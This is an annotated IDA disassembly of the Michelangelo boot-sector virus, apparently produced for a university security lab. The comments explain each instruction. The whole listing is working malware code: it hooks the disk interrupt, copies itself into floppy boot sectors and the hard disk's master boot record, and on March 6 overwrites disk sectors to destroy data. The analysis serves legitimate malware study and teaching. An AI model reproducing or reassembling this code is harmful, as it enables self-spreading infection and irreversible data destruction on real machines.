seg000:7C00 ;
seg000:7C00 ; +-------------------------------------------------------------------------+
seg000:7C00 ; |      This file was generated by The Interactive Disassembler (IDA)      |
seg000:7C00 ; |           Copyright (c) 2019 Hex-Rays, <support@hex-rays.com>           |
seg000:7C00 ; |                      License info: 48-BABB-7E64-E2                      |
seg000:7C00 ; |                     Georgia Institute of Technology                     |
seg000:7C00 ; +-------------------------------------------------------------------------+
seg000:7C00 ;
seg000:7C00 ; Input SHA256 : B8A70F4A55E3EF8F59363FDF1F6ECD8761F3B8CEF8DB122EB0B2081B8C4CCD0E
seg000:7C00 ; Input MD5    : 3FFC402675E30C6E42560EAA0A90A2B7
seg000:7C00 ; Input CRC32  : 827C7725
seg000:7C00
seg000:7C00 ; ---------------------------------------------------------------------------
seg000:7C00 ; File Name   : /nethome/pthirumal3/ECE4117/lab2/michelangelo.1
seg000:7C00 ; Format      : Binary file
seg000:7C00 ; Base Address: 0000h Range: 7C00h - 7E00h Loaded length: 0200h
seg000:7C00
seg000:7C00                 .686p
seg000:7C00                 .mmx
seg000:7C00                 .model flat
seg000:7C00
seg000:7C00 ; ===========================================================================
seg000:7C00
seg000:7C00 ; Segment type: Pure code
seg000:7C00 seg000          segment byte public 'CODE' use16
seg000:7C00                 assume cs:seg000
seg000:7C00                 ;org 7C00h
seg000:7C00                 assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
seg000:7C00                 jmp     memory_manip
seg000:7C00 ; ---------------------------------------------------------------------------
seg000:7C03 byte_7C03       db 0F5h                 ; DATA XREF: seg000:7CF0↓r
seg000:7C04                 db 0
seg000:7C05 word_7C05       dw 0                    ; DATA XREF: seg000:7CD8↓w
seg000:7C07                 db 2, 0Eh, 0
seg000:7C0A word_7C0A       dw 9739h                ; DATA XREF: seg000:7CC1↓w
seg000:7C0C word_7C0C       dw 0F000h               ; DATA XREF: seg000:7CC7↓w
seg000:7C0E ; ---------------------------------------------------------------------------
seg000:7C0E                 push    ds              ; Data segment register is now on the stack
seg000:7C0F                 push    ax              ;  Accumulator register is now on the stack
seg000:7C10                 or      dl, dl          ; Drive number A;
seg000:7C12                 jnz     short exit_interrupt ; If Disk drive register is not zero, there is an error. If there is an error, do not execute the virus
seg000:7C14                 xor     ax, ax          ; Set ax to 0
seg000:7C16                 mov     ds, ax          ; Set ds to system segment
seg000:7C18                 test    byte ptr ds:43Fh, 1 ; Test if drive motor is running
seg000:7C1D                 jnz     short exit_interrupt ; Drive motor is not running so exit the interrupt handler
seg000:7C1F                 pop     ax              ; Remove ax from stack
seg000:7C20                 pop     ds              ; Remove ds from stack
seg000:7C21                 pushf                   ; Push flag register onto stack
seg000:7C22                 call    dword ptr cs:0Ah ; Load the original MBR
seg000:7C27                 pushf                   ; Push flag register onto stack
seg000:7C28                 call    prep_virus      ; Call the actual virus function
seg000:7C2B                 popf                    ; Remove flag register from stack
seg000:7C2C                 retf    2               ; Far return
seg000:7C2F ; ---------------------------------------------------------------------------
seg000:7C2F
seg000:7C2F exit_interrupt:                         ; CODE XREF: seg000:7C12↑j
seg000:7C2F                                         ; seg000:7C1D↑j
seg000:7C2F                 pop     ax              ; Remove ax from stack
seg000:7C30                 pop     ds              ; Remove ds from stack
seg000:7C31                 jmp     dword ptr cs:0Ah ; Jump to where orginal MBR is located
seg000:7C36
seg000:7C36 ; =============== S U B R O U T I N E =======================================
seg000:7C36
seg000:7C36
seg000:7C36 prep_virus      proc near               ; CODE XREF: seg000:7C28↑p
seg000:7C36                 push    ax              ; Save registers
seg000:7C37                 push    bx              ; Save registers
seg000:7C38                 push    cx              ; Save registers
seg000:7C39                 push    dx              ; Save registers
seg000:7C3A                 push    ds              ; Save registers
seg000:7C3B                 push    es              ; Save registers
seg000:7C3C                 push    si              ; Save registers
seg000:7C3D                 push    di              ; Save registers
seg000:7C3E                 push    cs              ; Save registers
seg000:7C3F                 pop     ds              ; Remove ds from stack
seg000:7C40                 push    cs              ; Save registers
seg000:7C41                 pop     es              ; Remove es from stack
seg000:7C42                 mov     si, 4           ; Max number of failures  = 4
seg000:7C45
seg000:7C45 read_original:                          ; CODE XREF: prep_virus+29↓j
seg000:7C45                 mov     ax, 201h        ; Read one sector to check for infection
seg000:7C48                 mov     bx, 200h        ; Destination is 512 bytes beyond virus code
seg000:7C4B                 mov     cx, 1           ; Read track 0, sector 1 (MBR)
seg000:7C4E                 xor     dx, dx          ; Reset dx register to 0
seg000:7C50                 pushf                   ; Set stack as if an interrupt
seg000:7C51                 call    dword ptr ds:0Ah ; Load the original MBR
seg000:7C55                 jnb     short check_virus ; Original MBR called successfully. Jump to function that checks if virus already exists on the system
seg000:7C57                 xor     ax, ax          ; Reset ax to 0
seg000:7C59                 pushf                   ; Set stack as if an interrupt
seg000:7C5A                 call    dword ptr ds:0Ah ; Load the original MBR
seg000:7C5E                 dec     si              ; Number of tries remaining --
seg000:7C5F                 jnz     short read_original ; Loop back at most 4 times
seg000:7C61                 jmp     short quit_virus ; Loading the original MBR failed > 4 times so quit virus
seg000:7C63 ; ---------------------------------------------------------------------------
seg000:7C63
seg000:7C63 check_virus:                            ; CODE XREF: prep_virus+1F↑j
seg000:7C63                 xor     si, si          ; Reset failure counter register to 0
seg000:7C65                 cld                     ; Clear direction flag
seg000:7C66                 lodsw                   ; ax now has 1st word of virus
seg000:7C67                 cmp     ax, [bx]        ; Check if virus code already exits
seg000:7C69                 jnz     short start_virus ; Does not exist so start virus
seg000:7C6B                 lodsw                   ; ax now has virus code
seg000:7C6C                 cmp     ax, [bx+2]      ; Compare second words just to be sure
seg000:7C6F                 jz      short quit_virus ; Virus already exists so quit the program
seg000:7C71
seg000:7C71 start_virus:                            ; CODE XREF: prep_virus+33↑j
seg000:7C71                 mov     ax, 301h        ; Write original MBR block
seg000:7C74                 mov     dh, 1           ; To head 1
seg000:7C76                 mov     cl, 3           ; Sector 3
seg000:7C78                 cmp     byte ptr [bx+15h], 0FDh ; Is disk 360k?
seg000:7C7C                 jz      short size_verified ; Disk size checked so start virus
seg000:7C7E                 mov     cl, 0Eh         ; Select default drive if check for disk size failed
seg000:7C80
seg000:7C80 size_verified:                          ; CODE XREF: prep_virus+46↑j
seg000:7C80                 mov     ds:8, cx        ; Copy original MBR to first sector
seg000:7C84                 pushf                   ; Set stack as if an interrupt
seg000:7C85                 call    dword ptr ds:0Ah ; Call original interrupt 13 handler
seg000:7C89                 jb      short quit_virus ; Call failed so quit virus
seg000:7C8B                 mov     si, 3BEh        ; Source index to copy partition table info from
seg000:7C8E                 mov     di, 1BEh        ; Destination index to copy partition table to
seg000:7C91                 mov     cx, 21h ; '!'   ; Number of bytes to be copied
seg000:7C94                 cld                     ; Clear the flags
seg000:7C95                 rep movsw               ; Copy the partition table info
seg000:7C97                 mov     ax, 301h        ; Write virus to sector 1
seg000:7C9A                 xor     bx, bx          ; Reset pointer
seg000:7C9C                 mov     cx, 1           ; Write to sector 1
seg000:7C9F                 xor     dx, dx          ; Reset register
seg000:7CA1                 pushf                   ; Set stack as if an interrupt
seg000:7CA2                 call    dword ptr ds:0Ah ; Call original interrupt 13 handler
seg000:7CA6
seg000:7CA6 quit_virus:                             ; CODE XREF: prep_virus+2B↑j
seg000:7CA6                                         ; prep_virus+39↑j ...
seg000:7CA6                 pop     di              ; Reset registers
seg000:7CA7                 pop     si              ; Reset registers
seg000:7CA8                 pop     es              ; Reset registers
seg000:7CA9                 pop     ds              ; Reset registers
seg000:7CAA                 pop     dx              ; Reset registers
seg000:7CAB                 pop     cx              ; Reset registers
seg000:7CAC                 pop     bx              ; Reset registers
seg000:7CAD                 pop     ax              ; Resert registers
seg000:7CAE                 retn                    ; Terminate virus
seg000:7CAE prep_virus      endp
seg000:7CAE
seg000:7CAF ; ---------------------------------------------------------------------------
seg000:7CAF
seg000:7CAF memory_manip:                           ; CODE XREF: seg000:7C00↑j
seg000:7CAF                 xor     ax, ax          ; Reset register
seg000:7CB1                 mov     ds, ax          ; Reset ds register
seg000:7CB3                 cli                     ; Clear interrupt falgs
seg000:7CB4                 mov     ss, ax          ; Reset ss register
seg000:7CB6                 mov     ax, 7C00h       ; Virus load point
seg000:7CB9                 mov     sp, ax          ; Stack pointer points to virus load point
seg000:7CBB                 sti                     ; Set interrupt flags
seg000:7CBC                 push    ds              ; Push onto stack
seg000:7CBD                 push    ax              ; Save 7C00h for later reference
seg000:7CBE                 mov     ax, ds:4Ch      ; Get int 13h from vector table 4Ch = 13h * 4
seg000:7CC1                 mov     ds:word_7C0A, ax ; Save int 13h higher up into memory
seg000:7CC4                 mov     ax, ds:4Eh      ; Get int 13h from vector table. 4Eh = 13h * 4 + 2
seg000:7CC7                 mov     ds:word_7C0C, ax ; Save int 13h higher up into memory. 7C0C = 7C0A + 2
seg000:7CCA                 mov     ax, ds:413h     ; Check available memory in K
seg000:7CCD                 dec     ax              ; Reduce available memory by 1K
seg000:7CCE                 dec     ax              ; Reduce available memory by 1K
seg000:7CCF                 mov     ds:413h, ax     ; Save new value of available memory
seg000:7CD2                 mov     cl, 6           ; Used to calulate the location of the virus segment
seg000:7CD4                 shl     ax, cl          ; Multiply by 1024
seg000:7CD6                 mov     es, ax          ; es now marks the virus segment
seg000:7CD8                 mov     ds:word_7C05, ax ; Read virus sector higher up memory
seg000:7CDB                 mov     ax, 0Eh         ; Fake int 13h
seg000:7CDE                 mov     ds:4Ch, ax      ; Replace original int 13h with fake
seg000:7CE1                 mov     word ptr ds:4Eh, es ; Original int 13h segment is replaced with virus segment
seg000:7CE5                 mov     cx, 1BEh        ; Partition table info
seg000:7CE8                 mov     si, 7C00h       ; Virus load point
seg000:7CEB                 xor     di, di          ; Destination set to higher memory
seg000:7CED                 cld                     ; Clear direction flags
seg000:7CEE                 rep movsb               ; Copy to higher memory
seg000:7CF0                 jmp     dword ptr cs:byte_7C03 ; Jump to higher memory
seg000:7CF5 ; ---------------------------------------------------------------------------
seg000:7CF5                 xor     ax, ax          ; Reset ax register
seg000:7CF7                 mov     es, ax          ; Reset es register
seg000:7CF9                 int     13h             ; DISK - RESET DISK SYSTEM
seg000:7CF9                                         ; DL = drive (if bit 7 is set both hard disks and floppy disks reset)
seg000:7CFB                 push    cs              ; Save cs register onto stack
seg000:7CFC                 pop     ds              ; Remove ds from stack
seg000:7CFD                 mov     ax, 201h        ; Read one sector to check for infection
seg000:7D00                 mov     bx, 7C00h       ; Destination is at virus load point
seg000:7D03                 mov     cx, ds:8        ; Check against 1st sector of hard disk
seg000:7D07                 cmp     cx, 7           ; Is hard disk infected?
seg000:7D0A                 jnz     short check_HD  ; Hard disk not infected
seg000:7D0C                 mov     dx, 80h         ; Save original hard disk sector
seg000:7D0F                 int     13h             ; DISK - READ SECTORS INTO MEMORY
seg000:7D0F                                         ; AL = number of sectors to read, CH = track, CL = sector
seg000:7D0F                                         ; DH = head, DL = drive, ES:BX -> buffer to fill
seg000:7D0F                                         ; Return: CF set on error, AH = status, AL = number of sectors read
seg000:7D11                 jmp     short exit_virus ; Failed to read so exit
seg000:7D13 ; ---------------------------------------------------------------------------
seg000:7D13
seg000:7D13 check_HD:                               ; CODE XREF: seg000:7D0A↑j
seg000:7D13                 mov     cx, ds:8        ; Read original boot block
seg000:7D17                 mov     dx, 100h        ; To 07C00h
seg000:7D1A                 int     13h             ; DISK -
seg000:7D1C                 jb      short exit_virus ; Failed so exit
seg000:7D1E                 push    cs              ; Save the cs register
seg000:7D1F                 pop     es              ; Reset es register
seg000:7D20                 mov     ax, 201h        ; Read boot block
seg000:7D23                 mov     bx, 200h        ; Read 512 bytes
seg000:7D26                 mov     cx, 1           ; Sector 1
seg000:7D29                 mov     dx, 80h         ; Specify that you are reading from 1st hardisk
seg000:7D2C                 int     13h             ; DISK - READ SECTORS INTO MEMORY
seg000:7D2C                                         ; AL = number of sectors to read, CH = track, CL = sector
seg000:7D2C                                         ; DH = head, DL = drive, ES:BX -> buffer to fill
seg000:7D2C                                         ; Return: CF set on error, AH = status, AL = number of sectors read
seg000:7D2E                 jb      short exit_virus ; Read failed so exit
seg000:7D30                 xor     si, si          ; Reset si register
seg000:7D32                 cld                     ; Clear the direction flags
seg000:7D33                 lodsw                   ; ax now has first word of virus
seg000:7D34                 cmp     ax, [bx]        ; Is HD infected?
seg000:7D36                 jnz     short infect_HD ; Not infected so infect HD
seg000:7D38                 lodsw                   ; ax now has virus code
seg000:7D39                 cmp     ax, [bx+2]      ; Compare second word to double check
seg000:7D3C                 jnz     short infect_HD ; Not infected so infect HD
seg000:7D3E
seg000:7D3E exit_virus:                             ; CODE XREF: seg000:7D11↑j
seg000:7D3E                                         ; seg000:7D1C↑j ...
seg000:7D3E                 xor     cx, cx          ; Reset cx to be able to read year
seg000:7D40                 mov     ah, 4           ; Read date from computer's real time clock
seg000:7D42                 int     1Ah             ; CLOCK - READ DATE FROM REAL TIME CLOCK (AT,XT286,CONV,PS)
seg000:7D42                                         ; Return: DL = day in BCD
seg000:7D42                                         ; DH = month in BCD
seg000:7D42                                         ; CL = year in BCD
seg000:7D42                                         ; CH = century (19h or 20h)
seg000:7D44                 cmp     dx, 306h        ; Is it March 6th?
seg000:7D48                 jz      short destroy_data ; Yes Destroy!
seg000:7D4A                 retf                    ; Nope, just return
seg000:7D4B ; ---------------------------------------------------------------------------
seg000:7D4B
seg000:7D4B destroy_data:                           ; CODE XREF: seg000:7D48↑j
seg000:7D4B                 xor     dx, dx          ; Clear data
seg000:7D4D                 mov     cx, 1           ; cx = 1
seg000:7D50
seg000:7D50 infect_another_sec:                     ; CODE XREF: seg000:7D7F↓j
seg000:7D50                                         ; seg000:7D85↓j
seg000:7D50                 mov     ax, 309h        ; Write to sector
seg000:7D53                 mov     si, ds:8        ; Copy from first sector
seg000:7D57                 cmp     si, 3           ; Check num of bytes
seg000:7D5A                 jz      short infect_sector ; Matched so infect sector
seg000:7D5C                 mov     al, 0Eh         ; Number of sectors to write
seg000:7D5E                 cmp     si, 0Eh         ; Number of sectors that can be written
seg000:7D61                 jz      short infect_sector ; Match so infect
seg000:7D63                 mov     dl, 80h         ; Write to 1st hard disk
seg000:7D65                 mov     byte ptr ds:7, 4 ; Max number of head to write in HD (used later)
seg000:7D6A                 mov     al, 11h         ; Sectors to write count
seg000:7D6C
seg000:7D6C infect_sector:                          ; CODE XREF: seg000:7D5A↑j
seg000:7D6C                                         ; seg000:7D61↑j
seg000:7D6C                 mov     bx, 5000h       ; Arbitary memory location?
seg000:7D6F                 mov     es, bx          ; at 5000h:5000h
seg000:7D71                 assume es:nothing
seg000:7D71                 int     13h             ; Call interrupt 13 handler to write
seg000:7D73                 jnb     short write_failed ; If failed to write then try another sector
seg000:7D75                 xor     ah, ah          ; Clear return code
seg000:7D77                 int     13h             ; DISK - RESET DISK SYSTEM
seg000:7D77                                         ; DL = drive (if bit 7 is set both hard disks and floppy disks reset)
seg000:7D79
seg000:7D79 write_failed:                           ; CODE XREF: seg000:7D73↑j
seg000:7D79                 inc     dh              ; Go to next head
seg000:7D7B                 cmp     dh, ds:7        ; Verify that it is not greater than max head specified == 4
seg000:7D7F                 jb      short infect_another_sec ; Try to infect this head now
seg000:7D81                 xor     dh, dh          ; Reset head
seg000:7D83                 inc     ch              ; Try next cylinder instead
seg000:7D85                 jmp     short infect_another_sec ; Try this sector now
seg000:7D87 ; ---------------------------------------------------------------------------
seg000:7D87
seg000:7D87 infect_HD:                              ; CODE XREF: seg000:7D36↑j
seg000:7D87                                         ; seg000:7D3C↑j
seg000:7D87                 mov     cx, 7           ; Sector 7
seg000:7D8A                 mov     ds:8, cx        ; Write partition table to sector 7
seg000:7D8E                 mov     ax, 301h        ; Write to sector
seg000:7D91                 mov     dx, 80h         ; 1st hard disk
seg000:7D94                 int     13h             ; DISK - WRITE SECTORS FROM MEMORY
seg000:7D94                                         ; AL = number of sectors to write, CH = track, CL = sector
seg000:7D94                                         ; DH = head, DL = drive, ES:BX -> buffer
seg000:7D94                                         ; Return: CF set on error, AH = status, AL = number of sectors written
seg000:7D96                 jb      short exit_virus ; Failed to write so quit
seg000:7D98                 mov     si, 3BEh        ; Copy partition table info
seg000:7D9B                 mov     di, 1BEh        ; Write partition table here
seg000:7D9E                 mov     cx, 21h ; '!'   ; Number of bytes to be copied
seg000:7DA1                 rep movsw               ; Do the partition table copy
seg000:7DA3                 mov     ax, 301h        ; Write virus to HD
seg000:7DA6                 xor     bx, bx          ; At the beginning of sector
seg000:7DA8                 inc     cl              ; Write virus to sector 8
seg000:7DAA                 int     13h             ; DISK - WRITE SECTORS FROM MEMORY
seg000:7DAA                                         ; AL = number of sectors to write, CH = track, CL = sector
seg000:7DAA                                         ; DH = head, DL = drive, ES:BX -> buffer
seg000:7DAA                                         ; Return: CF set on error, AH = status, AL = number of sectors written
seg000:7DAC                 jmp     short exit_virus ; Hard disk now has virus so quit
seg000:7DAC ; ---------------------------------------------------------------------------
seg000:7DAE                 db 50h dup(0), 55h, 0AAh
seg000:7DAE seg000          ends
seg000:7DAE
seg000:7DAE
seg000:7DAE                 end
